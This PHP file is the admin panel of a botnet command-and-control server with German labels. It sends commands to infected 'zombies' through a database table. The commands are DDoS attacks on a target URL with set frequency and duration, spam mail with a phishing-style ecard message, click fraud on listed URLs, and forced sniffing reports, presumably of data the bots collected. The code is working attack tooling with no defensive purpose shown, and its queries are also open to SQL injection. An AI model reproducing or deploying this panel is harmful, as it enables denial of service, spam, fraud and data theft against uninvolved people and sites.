<?php
session_start();
include_once('config.php');
include_once('setup_db_conn.php');

// new command?
if(isset($_POST["frequency"])&&isset($_POST["duration"])&&isset($_POST["targeturl"])&&!empty($_POST["frequency"])&&!empty($_POST["duration"])&&!empty($_POST["targeturl"])) {
	// ddos command
	mysqli_query($link,'UPDATE zombies SET command="DDOS", timestamp=NOW(), target_url="'
						.htmlentities($_POST["targeturl"]).'", frequency='
						.htmlentities($_POST["frequency"]).', duration='
						.htmlentities($_POST["duration"]).';');
	header("Refresh:0; url=admin.php");
	exit();
} else if(isset($_GET["action"])&&($_GET["action"]=="IDLE"||$_GET["action"]=="SPAM"||$_GET["action"]=="CLICK"||$_GET["action"]=="REPORT")) {
	// idle command
	mysqli_query($link,'UPDATE zombies SET command="'.$_GET["action"].'";');
	header("Refresh:0; url=admin.php");
	exit();
}

?>
<html>
	<head>
		<style>
		.wurst {
			border: 1px solid;
			padding: 5px;
		}
		.kaese {
			padding: 2px;
			margin: 2px;
		}
		</style>
	</head>
	<body style="font-family:sans-serif;">

		<!-- Display Actions -->
		<div style="float:left;border-right:1px solid;padding-right:10px;">
			<b>Distributed Denial of Service</b>
			<p>			
				<form method="post" action="admin.php">
					Target-URL:<br>
					<input name="targeturl" type="hidden" value="http://www.yolocaust.de/tentob">
					<input style="width:15em;" class="kaese" disabled type="text" value="http://www.yolocaust.de/tentob"><br>
					Frequenz:<br>
					<input name="frequency" pattern="[0-9]+" style="width:4em;" class="kaese" type="text" value="3"> (Verbindungen pro Sekunde pro Zombie)<br>
					Dauer:<br>
					<input name="duration" style="width:4em;" class="kaese" type="text" value="10"> Sekunden<br>
					<input type="submit" value="Submit">
				</form>
			</p>
			
			<br><br>
			
			<b>SPAM Mail</b>
			<p>			
				<form method="get" action="admin.php">
					<input name="action" type="hidden" value="SPAM">
					Absender-Template:<br><?php $from= "<%^C2%^Fnames^%@%^Fdomains^%^%>"; ?>
					<input style="width:25em;" class="kaese" type="text" value="<?php echo htmlentities($from); ?>"><br>
					Betreff:<br><input style="width:25em;" class="kaese" type="text" value="Don‘t worry, be happy!"> <br>
					Body:<br>
					<textarea style="resize:vertical;" cols="60" rows="5">I‘m in hurry,
but i still love you...(as you can see on the ecard)
http://%^Flinksh^%/</textarea><br>
					<input type="submit" value="Submit">
				</form>
			</p>
			
			<br><br>
			
			<b>Click Fraud</b>
			<p>			
				<form method="get" action="admin.php">
					<input name="action" type="hidden" value="CLICK">
					URL-1:<input style="width:20em;" class="kaese" type="text" value="http://www.yolocaust.de"> <br>
					URL-2:<input style="width:20em;" class="kaese" type="text" value="http://www.yolocaust.de/tentob"> <br>
					URL-3:<input style="width:20em;" class="kaese" type="text" value="http://www.yolocaust.de/tentob/index.php"> <br>
					<input type="submit" value="Submit">
				</form>
			</p>
			
			<br><br>
			
			<b>Sniffing Report erzwingen</b>
			<p>			
				<form method="get" action="admin.php">
					<input name="action" type="hidden" value="REPORT">
					<input type="submit" value="Report">
				</form>
			</p>
		</div>
		<div style="float:left;padding-left:10px;">
			<!-- Display Zombies -->
			<?php  
			$query = 'SELECT * FROM zombies';
			$oneOddBot = false;
			if($result = mysqli_query($link,$query)) {
				?>
				<table style="border-collapse: collapse;">
					<tr>
						<th class="wurst">Zombie-ID</th>
						<th class="wurst">Letzte Verbindung</th>
						<th class="wurst">Zustand</th>
					</tr><?php
					while($row = mysqli_fetch_assoc($result)) {
						if(!$oneOddBot&&$row["command"]!="IDLE")
							$oneOddBot=true;
						?>
						<tr>
							<td class="wurst"><?php echo $row["id"] ?></td>
							<td class="wurst"><?php echo $row["last_connect"] ?></td>
							<td class="wurst"><?php echo $row["command"] ?></td>
						</tr>
					<?php
					}
					mysqli_free_result($result);
					?>
				</table>
				<?php
			}
			mysqli_close($link);
			?>
			
			<!-- Display Return to IDLE if needed -->
			<?php
			if($oneOddBot) {
				?>
				<p>
					<form method="get" action="admin.php">
						<input name="action" type="hidden" value="IDLE">
						<input type="submit" value="IDLE All Zombies">
					</form>
				</p>
				<?php
			}
			?>
		</div>

	</body>
</html>